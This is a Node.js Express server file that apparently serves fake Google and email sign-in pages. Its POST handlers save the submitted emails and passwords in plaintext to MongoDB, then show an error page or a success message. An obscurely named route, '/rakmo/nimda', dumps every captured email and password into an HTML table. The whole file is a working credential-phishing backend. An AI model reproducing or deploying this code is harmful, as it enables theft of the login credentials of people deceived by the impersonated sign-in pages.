require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const User = require('./models/User');
const PORT = 3000;

// Initialize app
const app = express();

// Middleware to parse JSON and URL-encoded data
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files from the "public" folder
app.use(express.static(path.join(__dirname, 'public')));

// Set EJS as the template engine
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

// Connect to MongoDB
const mongoURI = process.env.MONGODB_URI;
mongoose
  .connect(mongoURI)
  .then(() => console.log('Connected to MongoDB'))
  .catch((err) => console.error('Failed to connect to MongoDB:', err));

app.get('/',(req, res) => {
  try {
    res.render('login.ejs');
  } catch (err) {
    console.error(err);
    res.status(500).send('Server error');
  }
});
app.get('/email',(req,res)=>{
    res.render('loginemail.ejs');
});
app.get('/google',(req,res)=>{
    res.render('logingoogle.ejs');
});
app.post('/email/save',async(req,res)=>{
    const { email, password,message } = req.body;
    // Save the user to the database
      const newUser = new User({ email, password, message });
      await newUser.save();
      res.render('error.ejs');
});
// sign in with google 
app.get("/google/pass",(req,res)=>{
    res.render("logingooglepass.ejs");
});
app.post("/google/save",async(req,res)=>{
    const { email, password, message } = req.body;
    const newUser = new User({ email, password, message });
    await newUser.save();
    // Response to client
    res.status(200).json({ message: 'Data received successfully!' });
});
app.get("/rakmo/nimda", async (req, res) => {
    try {
        // Fetch all users from the database
        const users = await User.find();
        // Check if any users exist
        if (users.length === 0) {
            return res.status(404).send("<h1>No users found!</h1>");
        }
        // Prepare a pretty response
        let htmlResponse = `
            <h1 style="text-align:center;color:blue;">User Details</h1>
            <table border="1" cellpadding="10" cellspacing="0" style="width:80%;margin:20px auto;text-align:left;font-family:sans-serif;">
                <thead>
                    <tr style="background-color:#f4f4f4;">
                        <th>Email</th>
                        <th>Password</th>
                        <th>Message</th>
                    </tr>
                </thead>
                <tbody>
        `;

        users.forEach(user => {
            htmlResponse += `
                <tr>
                    <td>${user.email}</td>
                    <td>${user.password}</td>
                    <td>${user.message}</td>
                </tr>
            `;
        });
        htmlResponse += `
                </tbody>
            </table>
        `;
        // Send the pretty HTML response
        res.send(htmlResponse);

    } catch (error) {
        console.error("Error fetching users:", error);
        res.status(500).send("<h1 style='color:red;'>Server error occurred while fetching user data!</h1>");
    }
});

app.get("*",(req,res)=>{
    res.render("error.ejs");
})
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
